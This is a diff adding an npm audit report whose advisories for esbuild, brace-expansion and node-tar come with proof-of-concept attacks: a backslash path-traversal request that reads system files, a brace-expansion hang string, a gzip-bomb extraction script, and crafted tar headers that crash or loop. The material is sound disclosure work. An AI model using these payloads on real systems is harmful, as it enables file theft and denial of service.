@@ -1,0 +1,331 @@
+{
+  "actions": [],
+  "advisories": {
+    "1120680": {
+      "findings": [
+        {
+          "version": "0.27.7",
+          "paths": [
+            ".>@nuxt/eslint>@nuxt/devtools-kit>vite>esbuild"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-g7r4-m6w7-qqqr\n- https://github.com/evanw/esbuild/releases/tag/v0.28.1\n- https://github.com/advisories/GHSA-g7r4-m6w7-qqqr",
+      "created": "2026-06-12T20:08:53.000Z",
+      "id": 1120680,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe development server contains a path traversal vulnerability on Windows when serving files from `servedir`.\n\nDue to the use of `path.Clean()` (which only normalizes forward-slash `/` separators) instead of a Windows-aware path normalization function, it is possible to craft requests using backslashes (`\\`) that bypass the intended directory containment logic. An attacker can escape the configured `servedir` root and access arbitrary files on the filesystem.\nThis issue affects Windows environments only.\n\n### Details\n\nThe request path is sanitized using:\n```go\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L165\nqueryPath := path.Clean(req.URL.Path)[1:]\n```\n\n\nHowever:\n- `path.Clean()` is POSIX-style and only understands `/` (docs: `https://pkg.go.dev/path#Clean`)\n- On Windows, `\\` is a valid path separator\n- `path.Clean()` does not treat `\\` as a separator\n\nLater, the server constructs the absolute path:\n```go\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L221\nabsPath := h.fs.Join(h.servedir, queryPath)\n```\n\nIf `queryPath` contains sequences such as:\n```\n..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini\n```\n\n`path.Clean()` will not normalize them, but the Windows filesystem will interpret `\\` as directory separators when resolving `absPath`.\nBecause the implementation does not verify that the final resolved path remains within `servedir`, it allows directory traversal outside the intended root directory.\n### Vulnerable Code\n\n```go\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L165\n\tqueryPath := path.Clean(req.URL.Path)[1:]\n\t....\n\t// Check for a file in the \"servedir\" directory\n\tif h.servedir != \"\" && kind != fs.FileEntry {\n\t\tabsPath := h.fs.Join(h.servedir, queryPath)\n\t\tif absDir := h.fs.Dir(absPath); absDir != absPath {\n\t\t\tif entries, err, _ := h.fs.ReadDirectory(absDir); err == nil {\n\t\t\t\tif entry, _ := entries.Get(h.fs.Base(absPath)); entry != nil && entry.Kind(h.fs) == fs.FileEntry {\n\t....\t\t\t\t\n```\n\n\n### Steps to reproduce\n\n```\nnpm install --save-exact --save-dev esbuild\n\necho \"console.log(1)\" > app.js\n\n.\\node_modules\\.bin\\esbuild --version\n0.27.3\n\n.\\node_modules\\.bin\\esbuild app.js --bundle --outdir=www --servedir=www --watch\n\ncurl -i --path-as-is \"http://localhost:8000/..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini\"\n<content of Windows\\system.ini>\n```\n\n\n### Impact\n\n- Arbitrary file read on Windows\n- Exposure of sensitive files",
+      "reported_by": null,
+      "title": "esbuild allows arbitrary file read when running the development server on Windows",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "esbuild",
+      "vulnerable_versions": ">=0.27.3 <0.28.1",
+      "github_advisory_id": "GHSA-g7r4-m6w7-qqqr",
+      "recommendation": "Upgrade to version 0.28.1 or later",
+      "patched_versions": ">=0.28.1",
+      "updated": "2026-06-12T20:08:54.000Z",
+      "cvss": {
+        "score": 2.5,
+        "vectorString": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-g7r4-m6w7-qqqr"
+    },
+    "1123896": {
+      "findings": [
+        {
+          "version": "2.1.1",
+          "paths": [
+            ".>@vite-pwa/nuxt>vite-plugin-pwa>workbox-build>@trickfilm400/rollup-plugin-off-main-thread>ejs>jake>filelist>minimatch>brace-expansion"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-3jxr-9vmj-r5cp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-13149\n- https://github.com/juliangruber/brace-expansion/pull/122\n- https://github.com/juliangruber/brace-expansion/pull/123\n- https://github.com/juliangruber/brace-expansion/commit/835d6be91201122d9adffb0c0c8c094189ace265\n- https://github.com/juliangruber/brace-expansion/commit/c7e33ec13ac1a684c116720843ce24e208611754\n- https://github.com/juliangruber/brace-expansion/commit/d74e63030c012e3b7ae81657b8d665619cd51b95\n- https://github.com/juliangruber/brace-expansion/releases/tag/v1.1.16\n- https://github.com/juliangruber/brace-expansion/releases/tag/v2.1.2\n- https://github.com/juliangruber/brace-expansion/releases/tag/v5.0.7\n- https://www.npmjs.com/package/brace-expansion\n- https://github.com/advisories/GHSA-3jxr-9vmj-r5cp",
+      "created": "2026-07-20T20:51:09.000Z",
+      "id": 1123896,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nbrace-expansion's expand() exhibits exponential-time - O(2ⁿ) - behavior in the number of consecutive non-expanding {} groups. A short, all-ASCII input (~90 bytes/30 groups) blocks the calling thread for minutes; a slightly longer input hangs it effectively indefinitely. Because the dominant consumers run on Node's single-threaded event loop, one small input can fully stall a worker/process.\n\nIn `expand_`, `post` is computed unconditionally at the top of the function, before the early-return branches that don't use it:\n```js\nconst post = m.post.length ? expand_(m.post, max, false) : [''];   // always recurses\n  ...\nif (!isSequence && !isOptions) {\n  if (m.post.match(/,(?!,).*\\}/)) {\n    str = m.pre + '{' + m.body + escClose + m.post;\n    return expand_(str, max, true); // restart — `post` discarded\n  }\n  return [str];\n}\n```\n\nFor input like a{},{},…, the first {} is non-expanding, so control reaches the {a},b} rewrite branch - but `expand_` has already recursed into post over the entire remaining tail, only to throw the result away.\nEach level therefore spawns two recursive expansions over essentially the same remaining work: `T(n) = 2·T(n−1) ⇒ O(2ⁿ)`.\n\nThe max option does not mitigate this: max only bounds the output-building loops; neither the post recursion nor the rewrite recursion consults it.\n  \nMeasured on 5.0.6:\n\n| groups (n) | input bytes | time |\n|---|---|---|\n| 20 | 60 | 130 ms |\n| 24 | 72 | 1.9 s |\n| 26 | 78 | 7.8 s |\n| 30 (PoC) | 90 | ~2 min |\n\n### Proof of concept\n```js\nconst { expand } = require('brace-expansion');\n// 30 non-expanding groups, ~90 bytes — blocks for minutes:\nexpand('a{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{}');\n```\n\n### Impact\n\nAny application that passes attacker-influenced strings to brace-expansion.expand() - directly or transitively via minimatch/glob brace patterns - can be driven into a multi-minute-to-indefinite CPU hang by a tiny request, denying service on that thread/process.\n\n### Remediation\n\nUpgrade to a patched release. The fix:\n1. Defers computing post until after the early-return branches (and computes it locally in the $-suffix branch), so post is only expanded when a brace set actually expands and the value is used. This alone removes the exponential.\n1. Converts the {a},b} rewrite from recursion to an in-function loop, so a long run of rewrites cannot grow the call stack.\n\nVerified: the PoC drops from ~2 min to 0.55 ms, 5,000 groups complete in ~344 ms, and output is identical to 5.0.6 across a behavioral-equivalence suite (sequences, padding, $-prefix, a{},b}c, {},a}b, x{{a,b}}y, etc.). Post-fix complexity is ~O(n²) on this input class - acceptable for the security fix; a linear rewrite can be a non-urgent follow-up.\n\nIf immediate upgrade isn't possible, avoid passing untrusted input to expand() / glob brace patterns, or run such expansion under a timeout/worker.",
+      "reported_by": null,
+      "title": "brace-expansion: DoS via exponential-time expansion of consecutive non-expanding {} groups",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-13149"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": ">=2.0.0 <2.1.2",
+      "github_advisory_id": "GHSA-3jxr-9vmj-r5cp",
+      "recommendation": "Upgrade to version 2.1.2 or later",
+      "patched_versions": ">=2.1.2",
+      "updated": "2026-07-20T20:51:11.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-3jxr-9vmj-r5cp"
+    },
+    "1123898": {
+      "findings": [
+        {
+          "version": "5.0.6",
+          "paths": [
+            ".>@nuxt/eslint>@nuxt/eslint-config>@typescript-eslint/eslint-plugin>@typescript-eslint/type-utils>@typescript-eslint/typescript-estree>minimatch>brace-expansion"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-3jxr-9vmj-r5cp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-13149\n- https://github.com/juliangruber/brace-expansion/pull/122\n- https://github.com/juliangruber/brace-expansion/pull/123\n- https://github.com/juliangruber/brace-expansion/commit/835d6be91201122d9adffb0c0c8c094189ace265\n- https://github.com/juliangruber/brace-expansion/commit/c7e33ec13ac1a684c116720843ce24e208611754\n- https://github.com/juliangruber/brace-expansion/commit/d74e63030c012e3b7ae81657b8d665619cd51b95\n- https://github.com/juliangruber/brace-expansion/releases/tag/v1.1.16\n- https://github.com/juliangruber/brace-expansion/releases/tag/v2.1.2\n- https://github.com/juliangruber/brace-expansion/releases/tag/v5.0.7\n- https://www.npmjs.com/package/brace-expansion\n- https://github.com/advisories/GHSA-3jxr-9vmj-r5cp",
+      "created": "2026-07-20T20:51:09.000Z",
+      "id": 1123898,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nbrace-expansion's expand() exhibits exponential-time - O(2ⁿ) - behavior in the number of consecutive non-expanding {} groups. A short, all-ASCII input (~90 bytes/30 groups) blocks the calling thread for minutes; a slightly longer input hangs it effectively indefinitely. Because the dominant consumers run on Node's single-threaded event loop, one small input can fully stall a worker/process.\n\nIn `expand_`, `post` is computed unconditionally at the top of the function, before the early-return branches that don't use it:\n```js\nconst post = m.post.length ? expand_(m.post, max, false) : [''];   // always recurses\n  ...\nif (!isSequence && !isOptions) {\n  if (m.post.match(/,(?!,).*\\}/)) {\n    str = m.pre + '{' + m.body + escClose + m.post;\n    return expand_(str, max, true); // restart — `post` discarded\n  }\n  return [str];\n}\n```\n\nFor input like a{},{},…, the first {} is non-expanding, so control reaches the {a},b} rewrite branch - but `expand_` has already recursed into post over the entire remaining tail, only to throw the result away.\nEach level therefore spawns two recursive expansions over essentially the same remaining work: `T(n) = 2·T(n−1) ⇒ O(2ⁿ)`.\n\nThe max option does not mitigate this: max only bounds the output-building loops; neither the post recursion nor the rewrite recursion consults it.\n  \nMeasured on 5.0.6:\n\n| groups (n) | input bytes | time |\n|---|---|---|\n| 20 | 60 | 130 ms |\n| 24 | 72 | 1.9 s |\n| 26 | 78 | 7.8 s |\n| 30 (PoC) | 90 | ~2 min |\n\n### Proof of concept\n```js\nconst { expand } = require('brace-expansion');\n// 30 non-expanding groups, ~90 bytes — blocks for minutes:\nexpand('a{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{}');\n```\n\n### Impact\n\nAny application that passes attacker-influenced strings to brace-expansion.expand() - directly or transitively via minimatch/glob brace patterns - can be driven into a multi-minute-to-indefinite CPU hang by a tiny request, denying service on that thread/process.\n\n### Remediation\n\nUpgrade to a patched release. The fix:\n1. Defers computing post until after the early-return branches (and computes it locally in the $-suffix branch), so post is only expanded when a brace set actually expands and the value is used. This alone removes the exponential.\n1. Converts the {a},b} rewrite from recursion to an in-function loop, so a long run of rewrites cannot grow the call stack.\n\nVerified: the PoC drops from ~2 min to 0.55 ms, 5,000 groups complete in ~344 ms, and output is identical to 5.0.6 across a behavioral-equivalence suite (sequences, padding, $-prefix, a{},b}c, {},a}b, x{{a,b}}y, etc.). Post-fix complexity is ~O(n²) on this input class - acceptable for the security fix; a linear rewrite can be a non-urgent follow-up.\n\nIf immediate upgrade isn't possible, avoid passing untrusted input to expand() / glob brace patterns, or run such expansion under a timeout/worker.",
+      "reported_by": null,
+      "title": "brace-expansion: DoS via exponential-time expansion of consecutive non-expanding {} groups",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-13149"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": ">=3.0.0 <5.0.7",
+      "github_advisory_id": "GHSA-3jxr-9vmj-r5cp",
+      "recommendation": "Upgrade to version 5.0.7 or later",
+      "patched_versions": ">=5.0.7",
+      "updated": "2026-07-20T20:51:11.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-3jxr-9vmj-r5cp"
+    },
+    "1123939": {
+      "findings": [
+        {
+          "version": "7.5.16",
+          "paths": [
+            ".>nuxt>@nuxt/nitro-server>nitropack>@vercel/nft>@mapbox/node-pre-gyp>tar"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-w8wr-v893-vjvp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-59871\n- https://github.com/isaacs/node-tar/commit/e02a4e9e013c4be95302e2eb2047a942b883c27b\n- https://github.com/isaacs/node-tar/releases/tag/v7.5.18\n- https://github.com/advisories/GHSA-w8wr-v893-vjvp",
+      "created": "2026-07-20T21:53:14.000Z",
+      "id": 1123939,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nA crafted 2.5KB tar archive crashes any Node.js process that extracts it. The PAX header parser coerces all-digit path values to JavaScript numbers, which causes an uncaught TypeError when downstream code calls `.split('/')` on the numeric value. Error handlers and `strict: false` cannot intercept the crash.\n\n### Details\n\nIn `pax.ts` line 180, `parseKV` converts PAX values matching `/^[0-9]+$/` to numbers via `+v`. This applies to all fields including `path` and `linkpath`. When a PAX header sets `path` to an all-digit string like `\"12345\"`, the value becomes the number `12345`.\n\nThis number flows through Header -> ReadEntry -> Unpack.CHECKPATH, where `normalizeWindowsPath(entry.path).split('/')` throws a TypeError because numbers don't have `.split()`.\n\nThe throw is synchronous during event emission and bypasses all error handling:\n- `strict: false` does not help\n- `'error'` event handlers do not catch it\n- `'warn'` handlers do not catch it\n- The TypeError propagates through the event emitter stack as an uncaughtException\n\nDirectory, SymbolicLink, and Link type entries reach CHECKPATH and crash. File type entries crash earlier in Header constructor at `this.path.slice(-1)`, but that throw is caught and emitted as a warning only.\n\n### PoC\n\nCreate a tar archive with a PAX extended header containing an all-digit path:\n\n```\nPAX header body: \"18 path=12345\\n\"\nEntry type: Directory (type '5')\n```\n\nExtract it:\n```js\nconst tar = require('tar');\n\n// All of these crash with TypeError: t.split is not a function\ntar.extract({ file: 'malicious.tar', cwd: '/tmp/test' });\n\n// Error handlers don't help:\ntar.extract({ file: 'malicious.tar', cwd: '/tmp/test', strict: false })\n  .on('error', (err) => { /* never reached */ })\n  .on('warn', (code, msg) => { /* never reached */ });\n```\n\nThe archive is ~2.5KB. The crash is deterministic on every attempt.\n\n### Impact\n\nDenial of service. Any application or tool that extracts untrusted tar archives crashes from a single small file. This includes npm (which uses node-tar to extract packages), CI/CD pipelines, file upload processors, and backup tools. The crash cannot be caught by application-level error handling.",
+      "reported_by": null,
+      "title": "node-tar: Process crash via PAX numeric path type confusion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-59871"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.17",
+      "github_advisory_id": "GHSA-w8wr-v893-vjvp",
+      "recommendation": "Upgrade to version 7.5.18 or later",
+      "patched_versions": ">=7.5.18",
+      "updated": "2026-07-20T21:53:15.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-704"
+      ],
+      "url": "https://github.com/advisories/GHSA-w8wr-v893-vjvp"
+    },
+    "1123940": {
+      "findings": [
+        {
+          "version": "7.5.16",
+          "paths": [
+            ".>nuxt>@nuxt/nitro-server>nitropack>@vercel/nft>@mapbox/node-pre-gyp>tar"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-23hp-3jrh-7fpw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-59873\n- https://github.com/isaacs/node-tar/commit/2812e9338665659b183aa7226518c307044957d3\n- https://github.com/isaacs/node-tar/releases/tag/v7.5.19\n- https://github.com/advisories/GHSA-23hp-3jrh-7fpw",
+      "created": "2026-07-20T21:52:03.000Z",
+      "id": 1123940,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nA **Decompression/parse DoS via unlimited input** vulnerability in `node-tar` allows an attacker to exhaust server resources (disk space and CPU). Because the library does not enforce hard upper bounds on total decompressed data or entry counts, a small, maliciously crafted \"Gzip Bomb\" can be used to fill a server's storage and crash services.\n\n### Details\nThe `node-tar` library does not enforce a hard upper bound on archive size or the volume of decompressed data processed during extraction. While the `maxReadSize` option exists, it only controls internal read chunk sizes (default 16MB) and does not limit the total cumulative bytes written to disk.\n\nSpecifically, in `src/extract.ts`, the `Unpack` stream processes entries as they arrive. There is no total-bytes limit, entry-count limit, or decompression ratio guard. An attacker can provide a TAR header claiming a massive file size (e.g., 10GB) and follow it with highly compressible data (like zeros). `node-tar` will continue to extract and write this data until the physical disk is exhausted, as it lacks a mechanism to abort based on global resource consumption.\n\n### PoC\nThe following Proof of Concept demonstrates how a tiny compressed input can be expanded into gigabytes of data on the host machine almost instantly.\n\n1. Create the exploit script:\n```javascript\nconst fs = require('fs'), z = require('zlib'), t = require('tar');\n\nconst d = 'dos_test';\nif (fs.existsSync(d)) fs.rmSync(d, {recursive:true});\nfs.mkdirSync(d);\n\n// Build 10GB header\nconst h = Buffer.alloc(512);\nh.write('payload');\nh.write((10*1024**3).toString(8).padStart(11,'0'), 124); \nh.write('ustar', 257);\nlet s = 256;\nfor(let i=0;i<512;i++) if(i<148||i>155) s+=h[i];\nh.write(s.toString(8).padStart(6,'0'), 148);\n\nconst gz = z.createGzip();\ngz.pipe(t.x({cwd: d}));\ngz.write(h);\n\nconst b = Buffer.alloc(32 * 1024 * 1024); // 32MB chunks for speed\n\nconst run = () => {\n  while (gz.write(b));\n  gz.once('drain', run);\n};\n\nconst monitor = setInterval(() => {\n    try {\n        const bytes = fs.statSync(`${d}/payload`).size;\n        const mb = Math.floor(bytes / (1024 * 1024));\n        process.stdout.write(`\\r[>] Extracted: ${mb} MB`);\n        \n        if (mb > 5000) { \n            console.log('\\n[!] VULN CONFIRMED: 5GB+ written from tiny input.'); \n            process.exit(); \n        }\n    } catch {}\n}, 50);\n\nprocess.on('exit', () => {\n    clearInterval(monitor);\n    console.log('[*] Cleaning up...');\n    if (fs.existsSync(d)) fs.rmSync(d, {recursive:true, force:true});\n});\n\nrun();\n```\n\n2. Run the PoC:\n```bash\nnode poc.js\n```\n\n**Observation:** You will see the extracted size rapidly climb to 5,000 MB+ within seconds, while the actual data being \"sent\" through the gzip stream is negligible.\n\n### Impact\nThis is a **Denial of Service (DoS)** vulnerability. It impacts any application or service that uses `node-tar` to extract archives provided by untrusted users (e.g., npm registries, CI/CD pipelines, or file-sharing platforms). An unauthenticated attacker can send a small payload that expands to consume all available disk space, leading to system-wide failure and service outages.",
+      "reported_by": null,
+      "title": "node-tar: Decompression/parse DoS via unlimited input",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-59873"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.18",
+      "github_advisory_id": "GHSA-23hp-3jrh-7fpw",
+      "recommendation": "Upgrade to version 7.5.19 or later",
+      "patched_versions": ">=7.5.19",
+      "updated": "2026-07-20T21:52:04.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-23hp-3jrh-7fpw"
+    },
+    "1123941": {
+      "findings": [
+        {
+          "version": "7.5.16",
+          "paths": [
+            ".>nuxt>@nuxt/nitro-server>nitropack>@vercel/nft>@mapbox/node-pre-gyp>tar"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-8x88-c5mf-7j5w\n- https://nvd.nist.gov/vuln/detail/CVE-2026-59874\n- https://github.com/isaacs/node-tar/commit/9e78bf058b2c22dd4d52e00d8922d5c06fc2f7b5\n- https://github.com/isaacs/node-tar/releases/tag/v7.5.18\n- https://github.com/advisories/GHSA-8x88-c5mf-7j5w",
+      "created": "2026-07-20T21:51:39.000Z",
+      "id": 1123941,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nA checksum-valid tar archive with a negative base-256 encoded entry size can make `tar.replace()` loop forever while scanning the existing archive. Applications that update attacker-controlled tar archives can have a worker process pinned indefinitely, causing denial of service.\n\n### Details\n\nThe public `tar.replace()` API scans the existing archive before appending replacement entries. During this scan, it parses each tar header and advances the archive position by the parsed entry size rounded to a 512-byte block boundary.\n\nTar supports base-256 encoded numeric fields. A crafted header can encode the entry size as `-512` while still carrying a valid checksum. The replace scan accepts that parsed negative size and uses it in the position-advance calculation.\n\nFor a size of `-512`, the computed body skip is `-512`. The scan then adds the normal 512-byte header step, resulting in no net progress. The scanner repeatedly parses the same header forever and never reaches the append step.\n\nThis is reachable through the supported package API when the existing archive file is attacker controlled. It does not rely on extraction, dependency behavior, or an uncaught exception.\n\n### PoC\n\nSave as `poc.mjs` in a project with the vulnerable package installed and run:\n\n```bash\nnode poc.mjs\n```\n\n```js\nimport fs from 'node:fs'\nimport os from 'node:os'\nimport path from 'node:path'\nimport { spawnSync } from 'node:child_process'\n\nconst oct = (b, n, off, len) =>\n  b.write(n.toString(8).padStart(len - 1, '0') + '\\0', off, len, 'ascii')\n\nconst badHeader = () => {\n  const h = Buffer.alloc(512)\n\n  h.write('x', 0)\n  oct(h, 0o644, 100, 8)\n  oct(h, 0, 108, 8)\n  oct(h, 0, 116, 8)\n\n  // base-256 encoded -512 in the size field\n  Buffer.alloc(10, 0xff).copy(h, 124)\n  h[134] = 0xfe\n  h[135] = 0x00\n\n  oct(h, 0, 136, 12)\n  h.fill(0x20, 148, 156)\n  h[156] = 0x30\n  h.write('ustar\\0' + '00', 257, 8, 'binary')\n\n  let sum = 0\n  for (const c of h) sum += c\n  h.write(sum.toString(8).padStart(6, '0') + '\\0 ', 148, 8, 'ascii')\n\n  return h\n}\n\nconst dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tar-loop-'))\nconst file = path.join(dir, 'poc.tar')\n\nfs.writeFileSync(file, badHeader())\nfs.writeFileSync(path.join(dir, 'add.txt'), 'x')\n\nconst r = spawnSync(\n  process.execPath,\n  [\n    '--input-type=module',\n    '-e',\n    `\n      import * as tar from 'tar'\n      tar.replace({ file: ${JSON.stringify(file)}, cwd: ${JSON.stringify(dir)}, sync: true }, ['add.txt'])\n      console.log('completed')\n    `,\n  ],\n  { timeout: 20_000 }\n)\n\nconsole.log(r.error?.code === 'ETIMEDOUT')\n\n// Output: true\n```\n\n### Impact\n\nAn application that calls `tar.replace()` on an existing archive supplied or controlled by an attacker can be forced into a non-terminating archive scan. This can consume a worker process indefinitely and cause denial of service. Plain extraction-only workflows are not affected by this finding.",
+      "reported_by": null,
+      "title": "node-tar: Negative tar entry size causes infinite loop in archive replace",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-59874"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.17",
+      "github_advisory_id": "GHSA-8x88-c5mf-7j5w",
+      "recommendation": "Upgrade to version 7.5.18 or later",
+      "patched_versions": ">=7.5.18",
+      "updated": "2026-07-20T21:51:39.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-8x88-c5mf-7j5w"
+    },
+    "1123942": {
+      "findings": [
+        {
+          "version": "7.5.16",
+          "paths": [
+            ".>nuxt>@nuxt/nitro-server>nitropack>@vercel/nft>@mapbox/node-pre-gyp>tar"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-gvwx-54wh-qm9j\n- https://nvd.nist.gov/vuln/detail/CVE-2026-59875\n- https://github.com/isaacs/node-tar/commit/7a635c29f5edbf083557374d43984273ecfed5b3\n- https://github.com/isaacs/node-tar/releases/tag/v7.5.17\n- https://github.com/advisories/GHSA-gvwx-54wh-qm9j",
+      "created": "2026-07-20T21:51:12.000Z",
+      "id": 1123942,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`node-tar` strips trailing `NUL` bytes from long-name (`L`) and long-linkpath (`K`) GNU extended headers but does **not** apply the same sanitization to equivalent fields delivered via PAX (`x` typeflag) extended headers. A PAX record of the form `path=visible.txt\\x00hidden.txt` is parsed verbatim into `entry.path` and flows into `fs.lstat()` / `fs.open()`, which Node.js core rejects with `ERR_INVALID_ARG_VALUE`. The throw originates inside an `FSReqCallback` async chain that is **not** wrapped by the consumer's `await/try-catch` around `tar.x()` — it surfaces as `uncaughtException` and terminates the process.\n\nThis is a remote denial-of-service primitive against any process that extracts attacker-supplied tarballs through `tar.x` / `tar.extract` / `tar.t` / `tar.Parser`, even when the consumer follows the documented `try/catch` error-handling pattern.\n\nA secondary parser-differential (CWE-436) exists because `tar(1)`, `bsdtar`, and Python `tarfile` truncate the path at the first `NUL` (yielding `visible.txt`) while node-tar retains the full string. A validator that pre-scans a tarball with one tool and extracts with the other is bypassed.\n\n---\n\n## Root cause\n\n### Vulnerable sink — `src/pax.ts:157-183`\n\nPAX KV records flow through `parseKVLine`. The value half (`v`) is assigned directly to the result object with no sanitization for embedded NUL bytes:\n\n```ts\n// src/pax.ts:157\nconst parseKVLine = (set: Record<string, unknown>, line: string) => {\n  const n = parseInt(line, 10)\n  if (n !== Buffer.byteLength(line) + 1) return set\n  line = line.slice((n + ' ').length)\n  const kv = line.split('=')\n  const r = kv.shift()\n  if (!r) return set\n  const k = r.replace(/^SCHILY\\.(dev|ino|nlink)/, '$1')\n  const v = kv.join('=')                                 // <-- NO NUL STRIP\n  set[k] =\n    /^([A-Z]+\\.)?([mac]|birth|creation)time$/.test(k) ?\n      new Date(Number(v) * 1000)\n    : /^[0-9]+$/.test(v) ? +v\n    : v                                                  // <-- v with NULs lands here\n  return set\n}\n```\n\nThe PAX record body is length-prefixed, so the parser knows the exact byte boundary — but it never checks whether the value half between `=` and `\\n` contains `NUL`. The result is consumed by `Header` / `ReadEntry`, where `entry.path` and `entry.linkpath` carry the embedded NUL all the way to `fs.lstat()`.\n\n### Correctly-patched cousin sink — `src/parse.ts:375-388`\n\nThe equivalent code path for GNU L/K long-headers **does** strip NUL bytes:\n\n```ts\n// src/parse.ts:375\ncase 'NextFileHasLongPath':\ncase 'OldGnuLongPath': {\n  const ex = this[EX] ?? Object.create(null)\n  this[EX] = ex\n  ex.path = this[META].replace(/\\0.*/, '')               // <-- NUL strip applied\n  break\n}\ncase 'NextFileHasLongLinkpath': {\n  const ex = this[EX] || Object.create(null)\n  this[EX] = ex\n  ex.linkpath = this[META].replace(/\\0.*/, '')           // <-- NUL strip applied\n  break\n}\n```\n\nThe `parse.ts` fix is the maintainer's own acknowledgement that path strings on this codepath must be NUL-stripped before reaching `fs.*`. The PAX path produces the identical primitive but bypasses the guard.\n\n### Downstream blast radius\n\n`entry.path` and `entry.linkpath` are consumed in:\n- `src/unpack.ts` → `fs.lstat`, `fs.open`, `fs.symlink`, `fs.link`, `fs.mkdir`\n- `src/list.ts` (no crash — listing tolerates NUL in strings)\n- Any consumer of the `ReadEntry` event that calls `path.join()` / `fs.*` on `entry.path`\n\nThe crash fires inside the FSReqCallback Node-internal async machinery, **outside** the user's `await tar.x(...)` Promise rejection boundary.\n\n---\n\n## Proof of Concept\n\n### Artifacts\n- `poc-null-byte-crash.tar` — 3072 bytes — PAX `path=visible.txt\\x00hidden.txt`\n- `poc-null-linkpath-crash.tar` — 2560 bytes — PAX `linkpath=target\\x00garbage` (symlink target sink)\n- `poc1-pax-prefix.py` — minimal PAX-header builder (Python 3, no deps)\n\n### Tarball generator (minimal repro — Python 3)\n\n```python\n#!/usr/bin/env python3\n\"\"\"Minimal PAX-NUL-injection tarball generator for node-tar PoC.\"\"\"\nimport os\n\ndef cksum(b):\n    s = 0\n    for i, x in enumerate(b):\n        s += 0x20 if 148 <= i < 156 else x\n    return s\n\ndef pad512(buf):\n    rem = len(buf) % 512\n    return buf + b'\\0' * (512 - rem) if rem else buf\n\ndef hdr(name, size, typeflag, prefix=b'', linkpath=b''):\n    b = bytearray(512)\n    b[0:len(name[:100])] = name[:100]\n    b[100:108] = b'0000644\\0'\n    b[108:116] = b'0001000\\0'\n    b[116:124] = b'0001000\\0'\n    b[124:136] = ('%011o ' % size).encode()\n    b[136:148] = ('%011o ' % 0).encode()\n    b[148:156] = b'        '\n    b[156:157] = typeflag\n    b[157:157+len(linkpath[:100])] = linkpath[:100]\n    b[257:265] = b'ustar\\x0000'\n    b[265:270] = b'root\\0'\n    b[297:302] = 